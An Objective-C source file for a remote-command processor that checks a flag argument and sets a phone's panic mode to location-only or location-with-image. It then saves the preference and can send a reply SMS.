//
//  SetPanicModeProcessor.m
//  RCM
//
//  Created by Makara Khloth on 6/21/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SetPanicModeProcessor.h"
#import "PrefPanic.h"

@interface SetPanicModeProcessor (private)
- (void) sendReplySMS;
- (void) raiseSetPanicModeProcessorException;
- (BOOL) isValidFlag;
@end

@implementation SetPanicModeProcessor
/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetPanicModeProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(SetPanicModeProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"SetPanicModeProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetPanicModeProcessor
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"SetPanicModeProcessor--->doProcessingCommand")
 	if ([self isValidFlag]) {
		id <PreferenceManager> preferenceManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
		PrefPanic *prefPanic = (PrefPanic *)[preferenceManager preference:kPanic];
		if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue] == 1) {
			[prefPanic setMLocationOnly:NO];
		} else if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue] == 2) {
			[prefPanic setMLocationOnly:YES];
		}
		[preferenceManager savePreferenceAndNotifyChange:prefPanic]; // Need to notify because user can change mode while panic is ON
		[self sendReplySMS];
	} else {
		[self raiseSetPanicModeProcessorException];
	}
}

/**
 - Method name: sendReplySMS
 - Purpose: This method is invoked when checking and process is passed and need to reply response message 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) sendReplySMS {
	DLog (@"SetPanicModeProcessor--->sendReplySMS")
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	DLog (@"messageFormat %@", messageFormat)
	NSString *setPanicModeMessage = [NSString string];
	
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue] == 1)			
		setPanicModeMessage = [setPanicModeMessage stringByAppendingString:NSLocalizedString(@"kSetPanicModeLocationImage", @"")];
	else if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue] == 2) 
    	setPanicModeMessage = [setPanicModeMessage stringByAppendingString:NSLocalizedString(@"kSetPanicModeLocation", @"")];		
	
	setPanicModeMessage = [messageFormat stringByAppendingString:setPanicModeMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:setPanicModeMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) 
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:setPanicModeMessage];
}

/**
 - Method name: raiseSetPanicModeProcessorException
 - Purpose: This method is invoked when command argument checking is failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) raiseSetPanicModeProcessorException {
	DLog (@"SetPanicModeProcessor--->raiseSetPanicModeProcessorException")
	FxException* exception = [FxException exceptionWithName:@"Set panic mode processor exception"
												  andReason:@"Set panic mode error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: isValidFlag
 - Purpose: This method is invoked to check whether argument is conformed to specificiation. 
 - Argument list and description: No Return Type
 - Return description: YES if argument is conformed otherwise NO
 */

- (BOOL) isValidFlag {
	BOOL isFlag = NO;
	NSArray *args = [mRemoteCmdData mArguments];
	if ([args count] > 2) {
		if (([[args objectAtIndex:2] isEqualToString:@"1"]) || ([[args objectAtIndex:2] isEqualToString:@"2"])) {
			isFlag = YES;
		}
	}
	return (isFlag);
}

/**
 - Method name: dealloc
 - Purpose: Memory management
 - Argument list and description: No argument
 - Return description: No Return Type 
 */

- (void) dealloc {
	[super dealloc];
}

@end
